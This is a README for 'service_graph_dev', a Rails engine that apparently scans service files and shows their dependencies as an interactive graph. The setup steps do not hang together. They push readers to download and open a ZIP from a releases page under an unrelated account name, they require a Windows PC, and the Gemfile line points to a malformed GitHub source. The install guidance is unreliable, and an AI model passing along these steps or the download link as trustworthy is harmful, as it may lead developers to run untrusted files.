# ⚙️ service_graph_dev - See service links at a glance

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Retentive-flutter161/service_graph_dev/releases)

## 🧭 What this app does

service_graph_dev helps you see how one service affects other services in a Rails app. It scans your service files and draws a clear graph. You can then trace which parts of the app depend on each service.

Use it when you want to:

- see service relationships in one place
- check what may break if you change a service
- follow the path from one service to another
- search for a service by name
- narrow the view to one pack

It runs in development mode and mounts itself, so you do not need to edit your route file.

## 💻 What you need

Before you use service_graph_dev, make sure you have:

- a Windows PC
- internet access
- a recent version of Ruby and Rails on your system
- access to your project files
- Git installed if you plan to work from the source repository

For best results, close extra apps before you open a large project. A bigger codebase can take a bit longer to scan.

## 📥 Download

Visit this page to download the release files:

https://github.com/Retentive-flutter161/service_graph_dev/releases

Look for the latest release, then download the file that fits your setup. If you see a ZIP file, save it to your computer and open it after the download ends.

## 🛠️ Install in your Rails app

Add the gem to your `Gemfile` in the `development` group:

```ruby
group :development do
  gem "service_graph_dev", github: "nild"
end
```

Then run the bundle install command in your project folder:

```bash
bundle install
```

After that, start your Rails app in development mode.

## 🚀 Open the graph

Once your app is running, open the service graph in your browser. The engine mounts itself in development, so you do not need to add a custom route.

Use the page to:

- view all found services
- inspect service links
- zoom in and out of the graph
- move around the network
- refresh the scan after code changes

If the page does not open right away, check that your Rails app is running in development mode.

## 🔍 How the scan works

service_graph_dev checks these folders:

- `app/services`
- `packs/**/app/services`

It reads the files with static analysis. That means it looks at the code without running it.

It then builds a graph that shows:

- direct service links
- services affected at each depth
- the full chain from one service to another
- services inside a selected Packwerk pack

This helps you see what depends on what before you make a change.

## 🧭 Use the graph

The graph view gives you tools that make it easier to understand a service tree:

- **Search**: find a service by name
- **Depth control**: choose how far the graph should expand, from 1 to 6 levels
- **Blast radius view**: see every service touched at each level
- **Path tracing**: see the route from one service to another
- **Pack filter**: focus on one pack at a time
- **Descriptions**: read service notes from comment blocks
- **Refresh**: rebuild the graph after you update files

You can click nodes in the graph to explore related services. This helps you trace impact before you touch shared code.

## 🧩 Example use case

If you plan to change a service that sends customer email, you can open the graph and search for that service. The app can then show you:

- which services call it
- which services depend on those callers
- how far the effect spreads
- which path connects the services

That makes it easier to avoid changes that ripple through the app without warning.

## 🎨 Visual design

The graph uses a dark color scheme with strong contrast. This makes text easier to read on screen and helps the graph stay clear during long sessions.

It also uses a vis.js network layout, so the connections spread out in a way that is easy to follow.

## 🔄 Refreshing the data

The app keeps a 5-minute cache so it does not scan files on every view load. If you change a service file and want to see the newest graph right away, use the refresh action in the interface.

This is useful after:

- adding a new service
- changing a service name
- moving files between packs
- updating service comments
- changing how one service depends on another

## 🧪 Working with packs

If your app uses Packwerk packs, you can limit the scan to one pack. This keeps the graph focused and makes large apps easier to read.

Use pack filtering when you want to:

- review one area of the app
- reduce noise from unrelated services
- compare service groups inside a pack
- check the impact of changes in a single domain

## 🧰 Troubleshooting

If the graph page does not show what you expect, try these steps:

- make sure your Rails app is running in development mode
- confirm your service files are in `app/services` or `packs/**/app/services`
- refresh the graph after making file changes
- check that the gem is listed in the `development` group
- restart the Rails server if the page still looks stale

If the app runs but the graph is empty, the scan may not find any service files in the folders it checks.

## 📁 Project files

The main parts of the app are:

- the Rails engine for mounting the graph
- the scanner for reading service files
- the graph view for showing links
- the search and filter tools
- the cache for faster reloads

Each part works together to help you review service relationships from the browser.

## 📝 About this repository

service_graph_dev is a dev-only Rails engine made for visual review of service dependencies. It is meant for local use while you build and test a Rails app.

It helps you answer questions like:

- what depends on this service
- what will this change affect
- how does this service connect to the rest of the app
- which pack owns this code

## 📌 Quick setup checklist

- download the release from the link above
- add the gem to your `Gemfile`
- run `bundle install`
- start your Rails app in development mode
- open the graph in your browser
- search for a service and inspect the links